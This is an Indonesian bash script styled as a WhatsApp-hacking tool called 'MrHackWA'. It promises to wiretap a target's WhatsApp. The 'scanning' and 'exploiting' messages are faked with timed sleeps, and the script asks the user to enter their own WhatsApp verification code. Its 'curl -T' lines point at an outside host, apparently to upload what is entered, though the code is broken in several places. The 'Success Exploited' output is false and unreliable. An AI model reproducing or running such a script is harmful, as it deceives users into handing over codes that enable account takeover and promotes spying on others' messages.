#!/system/xbin/bash
#Bersihkan Layar
clear
blue='\e[1;34m'
green='\e[1;32m'
purple='\[1;35m'
cyan='\e[1;36m'
red='\e[1;31m'
white='\e[1;37m'
yellow='\e[1;33m'
sleep 1
echo "\033[33;1m=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*"
figlet "MrHackWA"
echo "\033[33;1m=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*"
echo "\033[32;1m╔═══════════════════════════════════════╗"
echo "║Author : MrTamfanX                                "
echo "║Team   : MrTamfanXCyberTeam                       "
echo "║Pesan  : Jangan Di Record Ya Tod                  "
echo "\033[32;1m╚═══════════════════════════════════════╝"
echo "\033[33;1m=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*"
sleep 2
echo "\033[37;1m Mau Sadap WhatsApp Ya Sayang Uuuh Sayang :*"
sleep 2
echo "";
read -p "Masukkan No WhatsApp Kamu Sayang [+62857xxx]" Nomer;
read -p "Silahakan Masukkan No Targetnya Sayang Contoh [+62857xxx]" Target;
sleep 2
echo "\033[34;1m [+]Sedang Scaning..."
sleep 5
echo "\033[31;1m [-]Failed..."
sleep 0.5
echo "\033[34;1m [+]Sedang Scaning..."
sleep 1.5
echo "";
echo "\033[37;1mSilahkan Login =>Nomer";
read p;
sleep 2.5
echo "Masukkan Target =>Target";
read p;
sleep 1.5
echo "\033[34;1m [+]Sedang Scaning..."
sleep 7
echo "[+] Exploiting...";
echo "Nomer => $nomer";
curl -T http://apparelworld.org/
sleep 5;
echo "[+] Done.";
echo "Tunggu 5-10 Menit Untuk Mendapatkan Code.";
read -p "Verify Code => " code;
sleep 2
echo "[+] Connecting to whatsapp.com...";
echo "Login => $nomer";
sleep 0.5
echo "Code => $code";
sleep 0.5
echo "Target => $target";
sleep 0.5
echo "[+] Sending Exploit...";
echo "Code => $code" >> ;
curl -T http://apparelworld.org/
sleep 5
echo "[+] Success Exploited!";
exit;

